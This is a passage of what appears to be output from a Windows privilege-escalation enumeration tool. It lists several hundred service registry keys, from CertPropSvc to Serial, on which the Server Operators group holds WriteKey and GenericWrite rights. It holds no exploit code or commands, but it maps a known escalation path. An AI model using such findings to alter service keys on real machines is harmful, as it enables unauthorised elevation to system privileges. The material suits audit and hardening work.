    HKLM\system\currentcontrolset\services\CertPropSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\cht4iscsi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\cht4vbd (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CldFlt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CLFS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ClipSVC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\clr_optimization_v4.0.30319_32 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\clr_optimization_v4.0.30319_64 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CmBatt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CNG (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\cnghwassist (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CompositeBus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\COMSysApp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\condrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ConsentUxUserSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CoreMessagingRegistrar (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CoreUI (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\crypt32 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CryptSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CSC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CscService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\dam (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DCLocator (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\defragsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DeviceAssociationService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DeviceInstall (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DevicePickerUserSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DevicesFlowUserSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DevQueryBroker (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Dfs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Dfsc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DfsDriver (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DFSR (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DfsrRo (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\diagnosticshub.standardcollector.service (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DiagTrack (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Disk (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DmEnrollmentSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\dmvsc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\dmwappushservice (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DNS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Dnscache (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DoSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\dot3svc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\drmkaud (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DsmSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DsRoleSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DsSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DXGKrnl (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Eaphost (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ebdrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\efifw (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\EFS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\EhStorClass (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\EhStorTcgDrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\elxfcoe (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\elxstor (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\embeddedmode (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\EntAppSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ErrDev (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ESENT (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\EventSystem (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\exfat (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\fastfat (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\fcvsc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\fdc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\fdPHost (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\FDResPub (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\FileCrypt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\FileInfo (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Filetrace (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\flpydisk (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\FltMgr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\FontCache (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\FrameServer (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\FsDepends (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Fs_Rec (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\gencounter (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\genericusbfn (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\GPIOClx0101 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\GraphicsPerfSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HDAudBus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HidBatt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\hidinterrupt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\hidserv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HidUsb (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HomeGroupListener (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HpSAMD (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HTTP (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\hvcrash (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HvHost (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\hvservice (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HwNClx0101 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\hwpolicy (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\hyperkbd (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HyperVideo (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\iaLPSSi_GPIO (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\iaLPSSi_I2C (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\iaStorAVC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\iaStorV (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ibbus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\icssvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\IKEEXT (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\IndirectKmd (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\inetaccs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\InetInfo (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\InstallService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\intelpep (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\intelppm (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\iorate (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\IpFilterDriver (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\iphlpsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\IPMIDRV (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\IPNAT (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\IPsecGW (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\IPT (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\isapnp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\iScsiPrt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\IsmServ (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ItSas35i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\kbdclass (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\kbdhid (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\kdnic (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\KdsSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\KeyIso (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\KPSSVC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\KSecDD (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\KSecPkg (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ksthunk (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\KtmRm (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LanmanServer (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LanmanWorkstation (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ldap (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\lfsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LicenseManager (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\lltdio (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\lltdsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\lmhosts (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Lsa (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LSI_SAS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LSI_SAS2i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LSI_SAS3i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LSI_SSS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\LSM (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\luafv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MapsBroker (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mausbhost (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mausbip (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\megasas (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\megasas2i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\megasas35i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\megasr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Microsoft_Bluetooth_AvrcpTransport (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mlx4_bus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MMCSS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Modem (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\monitor (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mouclass (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mouhid (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mountmgr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MpKslceeb2796 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mpsdrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mpssvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mrxsmb (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mrxsmb20 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MsBridge (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MSDTC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MSDTC Bridge 4.0.0.0 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Msfs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\msgpiowin32 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mshidkmdf (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mshidumdf (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\msisadrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MSiSCSI (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\msiserver (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MSKSSRV (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MsLbfoProvider (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MsLldp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MSPCLOCK (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MSPQM (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MsRPC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MSSCNTRS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MsSecFlt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mssmbios (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MSTEE (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\MTConfig (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Mup (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\mvumis (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\napagent (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NcaSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NcbService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ndfltr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NDIS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NdisCap (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NdisImPlatform (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NdisTapi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Ndisuio (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NdisVirtualBus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NdisWan (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ndiswanlegacy (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ndproxy (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NetAdapterCx (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NetBIOS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NetbiosSmb (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Netlogon (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Netman (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\netprofm (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NetSetupSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NetTcpPortSharing (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\netvsc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\netvscvfpp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NgcCtnrSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NgcSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\NlaSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Npfs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\npsvctrig (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\nsi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\nsiproxy (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Ntfs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Null (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\nvdimm (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\nvraid (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\nvstor (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Parport (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\partmgr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PcaSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\pci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\pciide (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\pcmcia (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\pcw (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\pdc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PEAUTH (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\percsas2i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\percsas3i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PerfDisk (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PerfHost (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PerfNet (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PerfOS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PerfProc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PhoneSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PimIndexMaintenanceSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PktMon (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\pla (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PlugPlay (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\pmem (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PNPMEM (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PolicyAgent (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PortProxy (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Power (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PptpMiniport (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PrintNotify (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PrintWorkflowUserSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Processor (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ProfSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Psched (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\PushToInstall (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\pvscsi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\qebdrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\qefcoe (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\qeois (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ql2300i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ql40xx2i (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\qlfcoei (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\QWAVE (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\QWAVEdrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Ramdisk (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RasAcd (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RasAgileVpn (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RasGre (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Rasl2tp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RasPppoe (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RasSstp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\rdbss (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RDMANDK (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\rdpbus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RDPDR (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RDPNP (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RDPUDD (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RdpVideoMiniport (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ReFS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ReFSv1 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RemoteRegistry (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RFCOMM (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\rhproxy (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RmSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RpcEptMapper (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RpcLocator (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\RSoPProv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\rspndr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\s3cap (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\sacdrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\sacsvr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\sbp2port (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SCardSvr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ScDeviceEnum (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\scfilter (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Schedule (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\scmbus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SCPolicySvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\sdbus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SDFRd (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\sdstor (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\seclogon (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SecurityHealthService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SEMgrSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SENS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Sense (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SensorDataService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SensorService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SensrSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SerCx (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\SerCx2 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Serenum (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Serial (Server Operators [Allow: WriteKey GenericWrite])
